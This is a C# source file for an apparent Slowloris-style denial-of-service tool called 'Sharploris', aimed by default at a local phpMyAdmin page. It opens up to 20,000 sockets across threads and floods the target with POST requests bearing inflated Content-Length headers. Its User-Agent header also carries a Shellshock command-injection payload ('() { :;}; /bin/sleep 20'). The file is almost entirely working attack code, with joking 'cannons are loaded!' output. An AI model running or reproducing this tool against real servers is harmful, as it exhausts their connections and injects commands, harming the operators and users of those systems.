using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sharploris
{
    class AttackContext
    {
        public string Url { get; set; }
        public string Host { get; set; }
        public string WAN { get; set; }
        public ushort Port { get; set; }
        public string Page { get; set; }

        public override string ToString()
        {
            return $@"Url: {Url}
Host: {Host}
WAN: {WAN}
Port: {Port}
Page: {Page}";
        }

        public string ToGetRequest()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append($"POST {Page} HTTP/1.1\r\n");
            sb.Append($"Host: {Host}\r\n");
            sb.Append($"User-Agent: () {{ :;}}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20\r\n");
            sb.Append($"Keep-Alive: {Program.Rng.Next(900, 1200)}\r\n");
            sb.Append($"X-a: {Program.Rng.Next(42, 1 * Program.MEGABYTES)}\r\n");
            sb.Append("Accept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n");
            sb.Append("Content-Type: application/x-www-form-urlencoded\r\n");
            sb.Append($"Content-length: {Program.Rng.Next(42, 1 * Program.MEGABYTES)}\r\n\r\n");
            return sb.ToString();
        }
    }

    class Program
    {
        public const int SECONDS = 1000;
        public const int MEGABYTES = 1000000;

        static int Num_threads { get; set; } = 20;
        static int Num_sockets_per_thread { get; set; } = 1000;
        static int Tcp_timeout { get; set; } = 5 * SECONDS;
        static int Retry_timeout { get; set; } = 5 * SECONDS;

        public static Random Rng { get; set; } = new Random(Guid.NewGuid().GetHashCode());

        static List<Thread> Threads { get; set; } = new List<Thread>();

        [MTAThread]
        static void Main(string[] args)
        {
            string bullshite_url = "http://localhost:8080/phpmyadmin/";

            AttackContext ctx = new AttackContext()
            {
                Url = bullshite_url,
                Host = GetHost(bullshite_url, true),
                WAN = ResolveHost(GetHost(bullshite_url, true)),
                Port = GetPort(bullshite_url),
                Page = GetPage(bullshite_url)
            };

            Start(ctx);

            Console.WriteLine(ctx.ToString());
            Console.ReadLine();

            while (true)
            {

            }

        }

        static List<TcpClient> Build_sockets(AttackContext ctx)
        {
            List<TcpClient> lst_clients = new List<TcpClient>();
            for (int i = 0; i < Num_sockets_per_thread; i++)
                try
                {
                    lst_clients.Add(new TcpClient(ctx.WAN, ctx.Port));
                }
                catch
                { //limit reached
                    Console.WriteLine($"Built {lst_clients.Count } sockets, cannons are loaded!");
                    break;
                }

            return lst_clients;
        }

        static void Do_attack(List<TcpClient> socks, AttackContext ctx)
        {
            byte[] pl = Encoding.UTF8.GetBytes(ctx.ToGetRequest());
            while (true)
            {
                for (int i = 0; i < socks.Count; i++)
                {
                    try
                    {
                        if(socks[i].Client.Connected)
                        {
                            int bytes_sent = socks[i].Client.Send(pl);
                            Console.WriteLine($"{bytes_sent } bytes sent! {GetRandomPunchline()}");
                        }else
                        {
                            socks[i] = new TcpClient(ctx.WAN, ctx.Port);
                        }
                    }catch (SocketException ex ) {
                        if (ex.ErrorCode == 10054)
                        {
                        }
                    }
                }
            }

        }

        /*
         * Content-Type: application/x-www-form-urlencoded
         */

        static string GetRandomPunchline()
        {
            string[] punchlines = new string[] { "POW!", "WHACK!", "SLAM!", "CRA-ACK!" };
            return punchlines[Rng.Next(0, punchlines.Length)];
        }

        static void Start(AttackContext ctx)
        {
            for (int i = 0; i < Num_threads; i++)
            {
                Thread t = new Thread(() =>
                {
                    var socks = Build_sockets(ctx);
                    Do_attack(socks, ctx);
                });
                Threads.Add(t);
            }

            for (int i = 0; i < Num_threads; i++)
                Threads[i].Start();
        }

        static void Reload(TcpClient c, AttackContext ctx)
        {
            try { c = new TcpClient(ctx.WAN, ctx.Port); } catch { Reload(c, ctx); }
        }

        /// <summary>
        /// (domain.com)/page.php
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        static string GetHost(string url, bool strip_port = false)
        {
            int j = 0;
            if (url.IndexOf("http") >= 0)
                j += 2;
            var res = url.Split('/')[j];
            if (strip_port)
                if (res.IndexOf(':') >= 0)
                    res = res.Split(':')[0];
            return res;
        }

        /// <summary>
        /// domain.com(/page.php)
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        static string GetPage(string url)
        {
            int offs = url.IndexOf('/');
            if (url.IndexOf("http") >= 0)
                offs += url.IndexOf('/');
            return url.Substring(url.IndexOf('/', offs));
        }

        /// <summary>
        /// Get port
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        static ushort GetPort(string url)
        {
            if (url.IndexOf("https") >= 0)
                return (ushort)443;
            var str_host = GetHost(url);
            if (str_host.IndexOf(':') >= 0)
                return ushort.Parse(str_host.Substring(str_host.IndexOf(':') + 1));
            return (ushort)80;
        }

        /// <summary>
        /// Resolve host
        /// </summary>
        /// <param name="host"></param>
        /// <returns></returns>
        static string ResolveHost(string host)
        {
            return Dns.GetHostEntry(host).AddressList[0].ToString();
        }
    }
}
